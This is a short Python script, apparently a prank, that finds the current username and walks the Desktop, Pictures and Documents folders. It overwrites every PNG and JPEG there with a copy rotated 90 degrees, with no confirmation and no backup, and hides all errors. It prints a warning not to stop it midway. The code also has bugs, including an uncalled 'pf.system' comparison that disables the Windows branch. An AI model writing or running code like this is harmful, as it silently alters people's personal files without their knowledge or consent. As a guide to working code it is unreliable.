import platform as pf
import getpass as gp
import cv2
import os


def photo_rotater(paths):
    for main_path in paths:
        # Checks the existence of path
        if not os.path.exists(main_path):
            continue
        print(f'{main_path}......')

        # Goes thro every image in the folder and subfolders
        for cur_dir , _ , files in os.walk(main_path):
            for fil in files:
                # Checks for invalid files
                if fil.startswith('.'):
                    continue
                # Checks if its an image
                if not (fil.endswith('.png') or fil.endswith('.jpg') or fil.endswith('.jpeg')):
                    continue
                # Rotates the image 90 degress counter clockwise
                try:
                    temp_img = cv2.imread( os.path.join(cur_dir,fil) )
                    new_img = cv2.rotate(temp_img, cv2.cv2.ROTATE_90_COUNTERCLOCKWISE)
                    cv2.imwrite( os.path.join(cur_dir,fil) , new_img )
                except:
                    continue

def get_user():
    try:
        ret = gp.getuser()
    except:
        try:
            if pf.system() == 'Darwin':
                temp_list = os.getcwd().split('/')
            elif pf.system() == 'Windows':
                temp_list = os.getcwd().split('\\')
            ret = temp_list [temp_list.index('Users') + 1]
        except:
            try:
                if pf.system() == 'Darwin':
                    temp_list = __file__.split('/')
                elif pf.system() == 'Windows':
                    temp_list = __file__.split('\\')
                ret = temp_list [temp_list.index('Users') + 1]
            except:
                ret = 'Unable to determine'
    return ret



if __name__ == "__main__" :
    print('WARNING! DO NOT STOP THE EXECUTION IN THE MIDDLE WHAT SO EVER!\n')
    user = get_user()
    if pf.system == 'Windows':
        paths = [
            f'C:\\Users\\{user}\\Desktop',
            f'C:\\Users\\{user}\\Pictures',
            f'C:\\Users\\{user}\\Documents']
    else:
        paths = [
            f'/Users/{user}/Desktop',
            f'/Users/{user}/Pictures',
            f'/Users/{user}/Documents']
    photo_rotater(paths)
    print('\nDONE!')

